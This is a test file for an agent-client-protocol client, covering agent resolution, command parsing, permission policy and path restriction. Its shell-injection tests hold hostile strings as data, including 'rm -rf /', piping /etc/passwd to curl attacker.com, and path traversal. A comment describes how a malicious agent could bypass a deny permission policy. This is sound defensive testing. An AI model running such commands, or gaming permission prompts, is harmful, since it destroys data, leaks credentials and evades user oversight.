import { beforeEach, describe, expect, mock, test } from "bun:test";
import {
  BUILT_IN_AGENTS,
  __setLaunchWhichFnForTests,
  resolveInstalledBuiltInAgentLaunch,
} from "../../../src/core/agent-registry";
import {
  AcpClientError,
  AmAcpClient,
  type PermissionPolicy,
  createAcpClient,
  createClientHandler,
  isPathAllowed,
  timeoutPromise,
} from "../../../src/protocols/acp/client";
import { listAgents, parseCommand, resolveAgent } from "../../../src/protocols/acp/registry";
import type { AcpSettings } from "../../../src/protocols/acp/types";

// ── Registry Tests ─────────────────────────────────────────────

describe("ACP Agent Registry", () => {
  describe("resolveAgent", () => {
    test("resolves built-in agent: claude", () => {
      const entry = resolveAgent("claude");
      expect(entry).not.toBeNull();
      expect(entry!.command).toContain("claude-agent-acp");
      expect(entry!.source).toBe("built-in");
    });

    test("resolves built-in agent: codex", () => {
      const entry = resolveAgent("codex");
      expect(entry).not.toBeNull();
      expect(entry!.command).toContain("codex-acp");
      expect(entry!.source).toBe("built-in");
    });

    test("resolves built-in agent: gemini", () => {
      const entry = resolveAgent("gemini");
      expect(entry).not.toBeNull();
      expect(entry!.command).toBe("gemini --acp");
      expect(entry!.source).toBe("built-in");
    });

    test("returns null for unknown agent", () => {
      const entry = resolveAgent("nonexistent-agent-xyz");
      expect(entry).toBeNull();
    });

    test("config override takes precedence over built-in", () => {
      const settings: AcpSettings = {
        agents: {
          claude: { command: "/custom/claude --acp --custom" },
        },
      };
      const entry = resolveAgent("claude", settings);
      expect(entry).not.toBeNull();
      expect(entry!.command).toBe("/custom/claude --acp --custom");
      expect(entry!.source).toBe("config");
    });

    test("config adds new agents not in built-in registry", () => {
      const settings: AcpSettings = {
        agents: {
          "my-custom-agent": { command: "./my-agent --acp" },
        },
      };
      const entry = resolveAgent("my-custom-agent", settings);
      expect(entry).not.toBeNull();
      expect(entry!.command).toBe("./my-agent --acp");
      expect(entry!.source).toBe("config");
    });

    test("falls through to built-in when config has no override", () => {
      const settings: AcpSettings = {
        agents: {
          "other-agent": { command: "./other" },
        },
      };
      const entry = resolveAgent("claude", settings);
      expect(entry).not.toBeNull();
      expect(entry!.source).toBe("built-in");
    });

    test("handles empty config settings", () => {
      const entry = resolveAgent("claude", {});
      expect(entry).not.toBeNull();
      expect(entry!.source).toBe("built-in");
    });

    test("handles undefined config settings", () => {
      const entry = resolveAgent("claude", undefined);
      expect(entry).not.toBeNull();
      expect(entry!.source).toBe("built-in");
    });
  });

  // ── Local-binary preference (Phase C of ADR-0033, borrowed from acpx) ──
  //
  // claude and codex both declare `localBinary` — if the shipped binary is on
  // PATH, prefer it over the `npx …@latest` cold-start. Uses
  // __setLaunchWhichFnForTests to stub Bun.which without mutating the real PATH.

  describe("resolveInstalledBuiltInAgentLaunch / local-binary preference", () => {
    const LOCAL_CLAUDE_PATH = "/usr/local/bin/claude-agent-acp";
    const LOCAL_CODEX_PATH = "/usr/local/bin/codex-acp";

    test("prefers local binary when claude-agent-acp is on PATH", () => {
      __setLaunchWhichFnForTests((name) =>
        name === "claude-agent-acp" ? LOCAL_CLAUDE_PATH : null,
      );
      try {
        const entry = resolveAgent("claude");
        expect(entry).not.toBeNull();
        expect(entry!.command).toBe(LOCAL_CLAUDE_PATH);
        expect(entry!.source).toBe("built-in");
      } finally {
        __setLaunchWhichFnForTests(null);
      }
    });

    test("prefers local binary when codex-acp is on PATH", () => {
      __setLaunchWhichFnForTests((name) => (name === "codex-acp" ? LOCAL_CODEX_PATH : null));
      try {
        const entry = resolveAgent("codex");
        expect(entry).not.toBeNull();
        expect(entry!.command).toBe(LOCAL_CODEX_PATH);
      } finally {
        __setLaunchWhichFnForTests(null);
      }
    });

    test("falls back to npx command when local binary is not on PATH", () => {
      __setLaunchWhichFnForTests(() => null);
      try {
        const entry = resolveAgent("claude");
        expect(entry).not.toBeNull();
        // When localBinary is absent from PATH, resolver returns spec.command.
        expect(entry!.command).toBe(BUILT_IN_AGENTS.claude.command);
        expect(entry!.command).toContain("npx");
      } finally {
        __setLaunchWhichFnForTests(null);
      }
    });

    test("gemini has no localBinary — command stays as native invocation", () => {
      __setLaunchWhichFnForTests((name) => (name === "gemini" ? "/opt/homebrew/bin/gemini" : null));
      try {
        const entry = resolveAgent("gemini");
        expect(entry).not.toBeNull();
        // gemini's command IS the native invocation ("gemini --acp"); we do
        // not second-guess it with a PATH lookup because localBinary is unset.
        expect(entry!.command).toBe("gemini --acp");
      } finally {
        __setLaunchWhichFnForTests(null);
      }
    });

    test("pure function: resolveInstalledBuiltInAgentLaunch honors localBinary", () => {
      __setLaunchWhichFnForTests((name) =>
        name === "claude-agent-acp" ? LOCAL_CLAUDE_PATH : null,
      );
      try {
        const resolved = resolveInstalledBuiltInAgentLaunch("claude", BUILT_IN_AGENTS.claude);
        expect(resolved).toBe(LOCAL_CLAUDE_PATH);
      } finally {
        __setLaunchWhichFnForTests(null);
      }
    });

    test("config override is NOT second-guessed by local-binary preference", () => {
      // Even with the local binary on PATH, a config override wins verbatim.
      __setLaunchWhichFnForTests((name) =>
        name === "claude-agent-acp" ? LOCAL_CLAUDE_PATH : null,
      );
      try {
        const settings: AcpSettings = {
          agents: { claude: { command: "/home/me/vendored-claude --acp" } },
        };
        const entry = resolveAgent("claude", settings);
        expect(entry).not.toBeNull();
        expect(entry!.command).toBe("/home/me/vendored-claude --acp");
        expect(entry!.source).toBe("config");
      } finally {
        __setLaunchWhichFnForTests(null);
      }
    });
  });

  describe("listAgents", () => {
    test("lists all tier-1-native built-in agents", () => {
      // ADR-0033: BUILT_IN_ACP_AGENTS was collapsed to the four verified
      // tier-1-native agents. The acp protocol-local registry only surfaces
      // spawnable entries. Tier-3 catalog-only agents (copilot, cursor, etc.)
      // are not resolved here; they live in BUILT_IN_AGENTS with runnable=false.
      const agents = listAgents();
      expect(agents.length).toBeGreaterThanOrEqual(4);
      const names = agents.map((a) => a.name);
      expect(names).toContain("claude");
      expect(names).toContain("codex");
      expect(names).toContain("gemini");
      expect(names).toContain("kiro");
    });

    test("agents are sorted by name", () => {
      const agents = listAgents();
      const names = agents.map((a) => a.name);
      const sorted = [...names].sort();
      expect(names).toEqual(sorted);
    });

    test("config overrides replace built-in entries", () => {
      const settings: AcpSettings = {
        agents: {
          claude: { command: "/custom/claude" },
        },
      };
      const agents = listAgents(settings);
      const claude = agents.find((a) => a.name === "claude");
      expect(claude).toBeDefined();
      expect(claude!.command).toBe("/custom/claude");
      expect(claude!.source).toBe("config");
    });

    test("config adds new entries alongside built-in", () => {
      const settings: AcpSettings = {
        agents: {
          "my-agent": { command: "./my-agent --acp" },
        },
      };
      const agents = listAgents(settings);
      const custom = agents.find((a) => a.name === "my-agent");
      expect(custom).toBeDefined();
      expect(custom!.source).toBe("config");
      // Built-in agents still present
      expect(agents.find((a) => a.name === "claude")).toBeDefined();
    });
  });

  describe("parseCommand", () => {
    test("parses single executable", () => {
      const { executable, args } = parseCommand("gemini");
      expect(executable).toBe("gemini");
      expect(args).toEqual([]);
    });

    test("parses executable with args", () => {
      const { executable, args } = parseCommand(
        "npx -y @agentclientprotocol/claude-agent-acp@latest",
      );
      expect(executable).toBe("npx");
      expect(args).toEqual(["-y", "@agentclientprotocol/claude-agent-acp@latest"]);
    });

    test("parses executable with flags", () => {
      const { executable, args } = parseCommand("gemini --acp");
      expect(executable).toBe("gemini");
      expect(args).toEqual(["--acp"]);
    });

    test("handles multiple spaces between args", () => {
      const { executable, args } = parseCommand("cmd   --flag1   --flag2");
      expect(executable).toBe("cmd");
      expect(args).toEqual(["--flag1", "--flag2"]);
    });

    test("throws on empty command", () => {
      expect(() => parseCommand("")).toThrow("Empty agent command");
    });

    test("throws on whitespace-only command", () => {
      expect(() => parseCommand("   ")).toThrow("Empty agent command");
    });
  });
});

// ── Client Tests ───────────────────────────────────────────────

describe("AmAcpClient", () => {
  describe("constructor / createAcpClient", () => {
    test("creates client instance", () => {
      const client = new AmAcpClient();
      expect(client).toBeDefined();
      expect(client.connected).toBe(false);
      expect(client.connectionInfo).toBeNull();
    });

    test("createAcpClient convenience function", () => {
      const client = createAcpClient();
      expect(client).toBeInstanceOf(AmAcpClient);
      expect(client.connected).toBe(false);
    });
  });

  describe("error handling (without subprocess)", () => {
    test("newSession throws when not connected", async () => {
      const client = new AmAcpClient();
      try {
        await client.newSession({ cwd: "/tmp" });
        expect(true).toBe(false); // should not reach
      } catch (err) {
        expect(err).toBeInstanceOf(AcpClientError);
        expect((err as AcpClientError).code).toBe("NOT_CONNECTED");
      }
    });

    test("prompt throws when not connected", async () => {
      const client = new AmAcpClient();
      try {
        await client.prompt("session-1", [{ type: "text", text: "hello" }]);
        expect(true).toBe(false);
      } catch (err) {
        expect(err).toBeInstanceOf(AcpClientError);
        expect((err as AcpClientError).code).toBe("NOT_CONNECTED");
      }
    });

    test("cancel throws when not connected", async () => {
      const client = new AmAcpClient();
      try {
        await client.cancel("session-1");
        expect(true).toBe(false);
      } catch (err) {
        expect(err).toBeInstanceOf(AcpClientError);
        expect((err as AcpClientError).code).toBe("NOT_CONNECTED");
      }
    });

    test("loadSession throws when not connected", async () => {
      const client = new AmAcpClient();
      try {
        await client.loadSession("session-1", { cwd: "/tmp" });
        expect(true).toBe(false);
      } catch (err) {
        expect(err).toBeInstanceOf(AcpClientError);
        expect((err as AcpClientError).code).toBe("NOT_CONNECTED");
      }
    });

    test("listSessions throws when not connected", async () => {
      const client = new AmAcpClient();
      try {
        await client.listSessions();
        expect(true).toBe(false);
      } catch (err) {
        expect(err).toBeInstanceOf(AcpClientError);
        expect((err as AcpClientError).code).toBe("NOT_CONNECTED");
      }
    });

    test("connectByName throws for unknown agent", async () => {
      const client = new AmAcpClient();
      try {
        await client.connectByName("nonexistent-agent");
        expect(true).toBe(false);
      } catch (err) {
        expect(err).toBeInstanceOf(AcpClientError);
        expect((err as AcpClientError).code).toBe("AGENT_NOT_FOUND");
        expect((err as AcpClientError).message).toContain("nonexistent-agent");
      }
    });

    test("disconnect is safe when not connected", async () => {
      const client = new AmAcpClient();
      // Should not throw
      await client.disconnect();
      expect(client.connected).toBe(false);
    });

    test("killSubprocess clears its grace timer when the process exits promptly (no leak)", async () => {
      // Regression for the Promise.race timer leak: killSubprocess races the
      // graceful `exited` against a `gracePeriodMs` setTimeout. When `exited`
      // wins, the orphaned timer keeps the event loop alive for the full grace
      // period unless it is explicitly cleared. The leak does NOT delay
      // killSubprocess's *return* (race resolves on `exited`), so we assert the
      // MECHANISM directly: clearTimeout must be called with the timer handle.
      // This fails on the pre-fix code, which never called clearTimeout.
      const realSetTimeout = globalThis.setTimeout;
      const realClearTimeout = globalThis.clearTimeout;
      const clearedHandles: unknown[] = [];
      let createdHandle: unknown;
      const g = globalThis as unknown as {
        setTimeout: typeof setTimeout;
        clearTimeout: typeof clearTimeout;
      };
      g.setTimeout = ((fn: (...a: unknown[]) => void, ms?: number) => {
        createdHandle = realSetTimeout(fn, ms);
        return createdHandle;
      }) as unknown as typeof setTimeout;
      g.clearTimeout = ((h: unknown) => {
        clearedHandles.push(h);
        return realClearTimeout(h as ReturnType<typeof setTimeout>);
      }) as unknown as typeof clearTimeout;

      try {
        const client = new AmAcpClient();
        let sigkilled = false;
        const fakeProc = {
          exited: Promise.resolve(0),
          kill: (sig?: string) => {
            if (sig === "SIGKILL") sigkilled = true;
          },
        };
        // Reach the private subprocess field via the same typed-cast pattern
        // used elsewhere in these tests (no production seam for a private method).
        (client as unknown as { subprocess: typeof fakeProc }).subprocess = fakeProc;

        await (
          client as unknown as { killSubprocess: (ms?: number) => Promise<void> }
        ).killSubprocess(5000);

        // Graceful exit won the race: SIGKILL must NOT have fired, and the grace
        // timer that was created MUST have been cleared (the leak fix).
        expect(sigkilled).toBe(false);
        expect(createdHandle).toBeDefined();
        expect(clearedHandles).toContain(createdHandle);
      } finally {
        globalThis.setTimeout = realSetTimeout;
        globalThis.clearTimeout = realClearTimeout;
      }
    });
  });

  describe("onSessionUpdate", () => {
    test("registers update handler", () => {
      const client = new AmAcpClient();
      const handler = mock(() => {});
      client.onSessionUpdate(handler);
      // Handler is stored, will be called when updates arrive
      expect(handler).not.toHaveBeenCalled();
    });

    test("registered handler is invoked when _handleSessionUpdate is called", () => {
      const client = new AmAcpClient();
      const received: unknown[] = [];
      client.onSessionUpdate((update) => received.push(update));

      // Simulate an update arriving
      client._handleSessionUpdate({
        sessionId: "s1",
        update: {
          sessionUpdate: "agent_message_chunk",
          content: { type: "text", text: "hello" },
        },
      } as any);

      expect(received).toHaveLength(1);
      expect((received[0] as any).sessionUpdate).toBe("agent_message_chunk");
    });

    test("handler is NOT called after a new handler replaces it", () => {
      const client = new AmAcpClient();
      const first: unknown[] = [];
      const second: unknown[] = [];

      client.onSessionUpdate((update) => first.push(update));
      client.onSessionUpdate((update) => second.push(update));

      client._handleSessionUpdate({
        sessionId: "s1",
        update: {
          sessionUpdate: "agent_message_chunk",
          content: { type: "text", text: "test" },
        },
      } as any);

      // Only the second handler should receive the update
      expect(first).toHaveLength(0);
      expect(second).toHaveLength(1);
    });
  });

  describe("_handleSessionUpdate state accumulation", () => {
    test("resets collected text/toolCalls between prompts (no cross-prompt bleed)", () => {
      const client = new AmAcpClient();

      // Simulate first prompt's updates
      client._handleSessionUpdate({
        sessionId: "s1",
        update: {
          sessionUpdate: "agent_message_chunk",
          content: { type: "text", text: "first reply" },
        },
      } as any);
      client._handleSessionUpdate({
        sessionId: "s1",
        update: {
          sessionUpdate: "tool_call",
          toolCallId: "tc-1",
          title: "Edit file",
          status: "completed",
          kind: "edit",
        },
      } as any);

      // Verify state was accumulated
      expect((client as any).collectedText).toBe("first reply");
      expect((client as any).collectedToolCalls).toHaveLength(1);

      // Calling resetCollected (as prompt() does at the start) should clear state
      (client as any).resetCollected();

      expect((client as any).collectedText).toBe("");
      expect((client as any).collectedToolCalls).toHaveLength(0);

      // Simulate second prompt's updates
      client._handleSessionUpdate({
        sessionId: "s1",
        update: {
          sessionUpdate: "agent_message_chunk",
          content: { type: "text", text: "second reply" },
        },
      } as any);

      // Should only contain second prompt's data
      expect((client as any).collectedText).toBe("second reply");
      expect((client as any).collectedToolCalls).toHaveLength(0);
    });

    test("handles unknown sessionUpdate types without crashing", () => {
      const client = new AmAcpClient();

      // Should not throw on an unrecognized update type
      expect(() => {
        client._handleSessionUpdate({
          sessionId: "s1",
          update: {
            sessionUpdate: "some_future_event_type",
            data: { foo: "bar" },
          },
        } as any);
      }).not.toThrow();

      // Collected state should be unchanged
      expect((client as any).collectedText).toBe("");
      expect((client as any).collectedToolCalls).toHaveLength(0);
    });

    test("accumulates text from multiple chunks", () => {
      const client = new AmAcpClient();

      client._handleSessionUpdate({
        sessionId: "s1",
        update: {
          sessionUpdate: "agent_message_chunk",
          content: { type: "text", text: "Hello " },
        },
      } as any);
      client._handleSessionUpdate({
        sessionId: "s1",
        update: {
          sessionUpdate: "agent_message_chunk",
          content: { type: "text", text: "World" },
        },
      } as any);

      expect((client as any).collectedText).toBe("Hello World");
    });

    test("accumulates multiple tool calls", () => {
      const client = new AmAcpClient();

      client._handleSessionUpdate({
        sessionId: "s1",
        update: {
          sessionUpdate: "tool_call",
          toolCallId: "tc-1",
          title: "Read file",
          status: "completed",
          kind: "read",
        },
      } as any);
      client._handleSessionUpdate({
        sessionId: "s1",
        update: {
          sessionUpdate: "tool_call",
          toolCallId: "tc-2",
          title: "Write file",
          status: "completed",
          kind: "write",
        },
      } as any);

      expect((client as any).collectedToolCalls).toHaveLength(2);
      expect((client as any).collectedToolCalls[0].toolCallId).toBe("tc-1");
      expect((client as any).collectedToolCalls[1].toolCallId).toBe("tc-2");
    });
  });
});

// ── AcpClientError ─────────────────────────────────────────────

describe("AcpClientError", () => {
  test("has correct name and properties", () => {
    const err = new AcpClientError("test error", "TEST_CODE");
    expect(err.name).toBe("AcpClientError");
    expect(err.message).toBe("test error");
    expect(err.code).toBe("TEST_CODE");
  });

  test("works without code", () => {
    const err = new AcpClientError("simple error");
    expect(err.code).toBeUndefined();
    expect(err.message).toBe("simple error");
  });

  test("is instanceof Error", () => {
    const err = new AcpClientError("test");
    expect(err).toBeInstanceOf(Error);
  });
});

// ── Schema Tests ───────────────────────────────────────────────

describe("ACP Settings Schema", () => {
  // Test that the schema validates correctly via the SettingsSchema
  const { SettingsSchema } = require("../../../src/core/schema");

  test("accepts valid acp settings", () => {
    const result = SettingsSchema.safeParse({
      acp: {
        session_dir: "~/.agent-manager/sessions",
        agents: {
          claude: { command: "npx -y @agentclientprotocol/claude-agent-acp@latest" },
          "my-agent": { command: "./my-agent --acp" },
        },
      },
    });
    expect(result.success).toBe(true);
  });

  test("accepts acp settings with only session_dir", () => {
    const result = SettingsSchema.safeParse({
      acp: {
        session_dir: "/tmp/sessions",
      },
    });
    expect(result.success).toBe(true);
  });

  test("accepts acp settings with only agents", () => {
    const result = SettingsSchema.safeParse({
      acp: {
        agents: {
          claude: { command: "claude --acp" },
        },
      },
    });
    expect(result.success).toBe(true);
  });

  test("accepts empty acp settings", () => {
    const result = SettingsSchema.safeParse({
      acp: {},
    });
    expect(result.success).toBe(true);
  });

  test("accepts settings without acp section", () => {
    const result = SettingsSchema.safeParse({
      default_profile: "work",
    });
    expect(result.success).toBe(true);
  });

  test("rejects acp agent without command", () => {
    const result = SettingsSchema.safeParse({
      acp: {
        agents: {
          claude: { notcommand: "bad" },
        },
      },
    });
    expect(result.success).toBe(false);
  });

  test("rejects acp agent with non-string command", () => {
    const result = SettingsSchema.safeParse({
      acp: {
        agents: {
          claude: { command: 42 },
        },
      },
    });
    expect(result.success).toBe(false);
  });
});

// ── HIGH-2: createTerminal shell injection prevention ───────────

describe("createTerminal shell injection prevention", () => {
  test("parseCommand splits command without shell expansion", () => {
    // A command with shell metacharacters should be split into tokens, not executed via sh -c
    const { executable, args } = parseCommand("echo hello && rm -rf /");
    expect(executable).toBe("echo");
    expect(args).toEqual(["hello", "&&", "rm", "-rf", "/"]);
    // When passed to Bun.spawn as an array, "&&" is a literal argument, not shell operator
  });

  test("parseCommand handles pipe characters as literal arguments", () => {
    const { executable, args } = parseCommand("cat /etc/passwd | curl attacker.com");
    expect(executable).toBe("cat");
    expect(args).toEqual(["/etc/passwd", "|", "curl", "attacker.com"]);
  });

  test("parseCommand handles semicolons as literal arguments", () => {
    const { executable, args } = parseCommand("ls; rm -rf /");
    expect(executable).toBe("ls;");
    expect(args).toEqual(["rm", "-rf", "/"]);
    // "ls;" is a literal executable name, not "ls" followed by shell separator
  });

  test("parseCommand handles subshell syntax as literal arguments", () => {
    const { executable, args } = parseCommand("$(curl attacker.com)");
    expect(executable).toBe("$(curl");
    expect(args).toEqual(["attacker.com)"]);
  });
});

// ── HIGH-1: Permission policy ──────────────────────────────────

describe("AmAcpClient permission policy", () => {
  test("default permission policy is 'deny' (secure-by-default, 2026-05-02)", () => {
    // Class default was flipped from "auto-approve" to "deny" so callers that
    // forget to configure the policy fail closed. Any caller that genuinely
    // needs headless auto-approve must opt in explicitly via
    // setPermissionPolicy("auto-approve"). Call sites audited in the same
    // commit: run.ts (headless CLI), flow.ts (headless orchestration),
    // mcp/server.ts am_agent_invoke (headless MCP tool).
    const client = new AmAcpClient();
    expect((client as any).permissionPolicy).toBe("deny");
  });

  test("setPermissionPolicy can switch to auto-approve (opt-in for headless callers)", () => {
    const client = new AmAcpClient();
    client.setPermissionPolicy("auto-approve");
    expect((client as any).permissionPolicy).toBe("auto-approve");
  });

  test("setPermissionPolicy can switch back to deny", () => {
    const client = new AmAcpClient();
    client.setPermissionPolicy("auto-approve");
    client.setPermissionPolicy("deny");
    expect((client as any).permissionPolicy).toBe("deny");
  });
});

// ── MEDIUM-3: Path restriction for readTextFile/writeTextFile ────

describe("isPathAllowed (MEDIUM-3)", () => {
  test("allows path within allowed directory", () => {
    expect(isPathAllowed("/home/user/project/src/file.ts", ["/home/user/project"])).toBe(true);
  });

  test("allows path that is exactly the allowed directory", () => {
    expect(isPathAllowed("/home/user/project", ["/home/user/project"])).toBe(true);
  });

  test("rejects path outside allowed directory", () => {
    expect(isPathAllowed("/etc/passwd", ["/home/user/project"])).toBe(false);
  });

  test("rejects path traversal attack (../)", () => {
    expect(isPathAllowed("/home/user/project/../../../etc/passwd", ["/home/user/project"])).toBe(
      false,
    );
  });

  test("rejects path that is a prefix but not a child directory", () => {
    // /home/user/project-evil is not a child of /home/user/project
    expect(isPathAllowed("/home/user/project-evil/file.ts", ["/home/user/project"])).toBe(false);
  });

  test("allows paths in any of multiple allowed directories", () => {
    const allowed = ["/home/user/project", "/tmp/scratch"];
    expect(isPathAllowed("/tmp/scratch/output.txt", allowed)).toBe(true);
    expect(isPathAllowed("/home/user/project/src/main.ts", allowed)).toBe(true);
  });

  test("rejects all paths when allowed list is empty", () => {
    expect(isPathAllowed("/home/user/project/file.ts", [])).toBe(false);
  });

  test("handles deeply nested allowed paths", () => {
    expect(isPathAllowed("/a/b/c/d/e/f.txt", ["/a/b/c"])).toBe(true);
  });

  test("handles relative path resolution", () => {
    // path.resolve will resolve relative paths against cwd
    const cwd = process.cwd();
    expect(isPathAllowed("./file.ts", [cwd])).toBe(true);
  });
});

describe("AmAcpClient allowed paths", () => {
  test("default allowedPaths is empty array", () => {
    const client = new AmAcpClient();
    expect((client as any).allowedPaths).toEqual([]);
  });

  test("setAllowedPaths updates the allowed paths", () => {
    const client = new AmAcpClient();
    client.setAllowedPaths(["/home/user/project", "/tmp"]);
    expect((client as any).allowedPaths).toEqual(["/home/user/project", "/tmp"]);
  });
});

// ── MEDIUM-3: ACP allowed_paths schema ──────────────────────────

describe("ACP allowed_paths schema", () => {
  const { SettingsSchema } = require("../../../src/core/schema");

  test("accepts acp settings with allowed_paths", () => {
    const result = SettingsSchema.safeParse({
      acp: {
        allowed_paths: ["/home/user/project", "/tmp"],
      },
    });
    expect(result.success).toBe(true);
  });

  test("accepts acp settings with agents and allowed_paths", () => {
    const result = SettingsSchema.safeParse({
      acp: {
        agents: { claude: { command: "claude --acp" } },
        allowed_paths: ["/home/user/project"],
      },
    });
    expect(result.success).toBe(true);
  });

  test("rejects non-array allowed_paths", () => {
    const result = SettingsSchema.safeParse({
      acp: {
        allowed_paths: "/home/user/project",
      },
    });
    expect(result.success).toBe(false);
  });
});

// ── requestPermission deny-policy bypass (2026-05-02 adversarial-review) ──
//
// SEC-1: under `permissionPolicy: "deny"`, the old fallback code selected
// `options[0]` when no `reject_*` option existed. A malicious ACP agent
// could send `options: [{kind: "allow_always", optionId: "x"}]` and have
// the "allow_always" selected — trivially bypassing the deny default.
// The fix returns `{ outcome: "cancelled" }` instead.

describe("requestPermission — deny-policy cannot be bypassed by missing reject option", () => {
  test("deny + reject option present → returns the reject option (baseline)", async () => {
    const handler = createClientHandler(null, "deny");
    const res = await handler.requestPermission({
      sessionId: "s1",
      toolCall: {
        toolCallId: "tc1",
        title: "test",
        kind: "execute",
        status: "pending",
        content: [],
      },
      options: [
        { kind: "allow_once", optionId: "ok1", name: "Allow" },
        { kind: "reject_once", optionId: "no1", name: "Reject" },
      ],
    });
    expect(res.outcome.outcome).toBe("selected");
    if (res.outcome.outcome === "selected") {
      expect(res.outcome.optionId).toBe("no1");
    }
  });

  test("deny + NO reject option → returns 'cancelled' (bypass blocked)", async () => {
    // The adversarial payload: agent sends only allow_* options hoping the
    // fallback selects options[0]. Must NOT select allow_always.
    const handler = createClientHandler(null, "deny");
    const res = await handler.requestPermission({
      sessionId: "s1",
      toolCall: {
        toolCallId: "tc1",
        title: "test",
        kind: "execute",
        status: "pending",
        content: [],
      },
      options: [
        { kind: "allow_always", optionId: "dangerous1", name: "Always allow" },
        { kind: "allow_once", optionId: "dangerous2", name: "Allow once" },
      ],
    });
    // Must not be "selected" — that would grant permission via bypass.
    expect(res.outcome.outcome).toBe("cancelled");
  });

  test("createClientHandler default (no policy arg) is 'deny' (secure-by-default)", async () => {
    // Class-level default flip (2026-05-02). Any caller constructing a client
    // without passing a policy inherits "deny" — fails closed. Regression-lock
    // on the class default so a future change to "auto-approve" fails this test.
    const handler = createClientHandler(null);
    const res = await handler.requestPermission({
      sessionId: "s1",
      toolCall: {
        toolCallId: "tc1",
        title: "test",
        kind: "execute",
        status: "pending",
        content: [],
      },
      options: [
        { kind: "allow_once", optionId: "allow1", name: "Allow" },
        { kind: "reject_once", optionId: "reject1", name: "Reject" },
      ],
    });
    expect(res.outcome.outcome).toBe("selected");
    if (res.outcome.outcome === "selected") {
      // Deny policy selects reject, not allow.
      expect(res.outcome.optionId).toBe("reject1");
    }
  });

  test("AmAcpClient instance default is 'deny' (class-level regression)", async () => {
    // Mirror the handler test against the full AmAcpClient class so a future
    // refactor can't silently revert the class-field default.
    const client = new AmAcpClient();
    // The private field isn't exported; we can only observe behavior via a
    // spawn. But even without spawning, the field's default is asserted via
    // createClientHandler's default above. A minimal structural probe:
    const src = await Bun.file(
      new URL("../../../src/protocols/acp/client.ts", import.meta.url),
    ).text();
    // The class-field initializer must be "deny", not "auto-approve".
    expect(src).toMatch(/private\s+permissionPolicy:\s*PermissionPolicy\s*=\s*"deny"/);
    expect(client).toBeInstanceOf(AmAcpClient);
  });

  test("auto-approve + allow_once option present → selects allow (baseline)", async () => {
    const handler = createClientHandler(null, "auto-approve");
    const res = await handler.requestPermission({
      sessionId: "s1",
      toolCall: {
        toolCallId: "tc1",
        title: "test",
        kind: "execute",
        status: "pending",
        content: [],
      },
      options: [
        { kind: "reject_once", optionId: "no1", name: "Reject" },
        { kind: "allow_once", optionId: "ok1", name: "Allow" },
      ],
    });
    expect(res.outcome.outcome).toBe("selected");
    if (res.outcome.outcome === "selected") {
      expect(res.outcome.optionId).toBe("ok1");
    }
  });
});

// ── timeoutPromise (BUG-2: timer must be clearable) ─────────────
//
// The init race in connect() used to leak its setTimeout: on a successful
// initialize() the rejecting timer stayed pending for the full window and
// kept the event loop alive (`am run` hung at exit). timeoutPromise() now
// returns a { promise, clear } handle so connect() can cancel the timer in
// its finally block. These tests pin that contract directly.

describe("timeoutPromise (BUG-2 regression)", () => {
  test("rejects with a TIMEOUT AcpClientError when not cleared", async () => {
    const t = timeoutPromise<never>(5, "boom");
    let caught: unknown;
    try {
      await t.promise;
    } catch (err) {
      caught = err;
    }
    expect(caught).toBeInstanceOf(AcpClientError);
    expect((caught as AcpClientError).code).toBe("TIMEOUT");
    expect((caught as AcpClientError).message).toBe("boom");
  });

  test("clear() cancels the timer so the promise never rejects", async () => {
    const t = timeoutPromise<string>(5, "should-not-fire");
    t.clear();
    // Race the (now-cancelled) timeout against a longer settle window. If the
    // timer had survived clear(), it would reject within 5ms and we'd see
    // "rejected"; a cleared timer leaves the promise pending → "settled" wins.
    const outcome = await Promise.race([
      t.promise.then(
        () => "resolved",
        () => "rejected",
      ),
      new Promise<string>((resolve) => setTimeout(() => resolve("settled"), 40)),
    ]);
    expect(outcome).toBe("settled");
  });

  test("clear() is idempotent (safe to call twice)", () => {
    const t = timeoutPromise<void>(1000, "x");
    expect(() => {
      t.clear();
      t.clear();
    }).not.toThrow();
  });
});
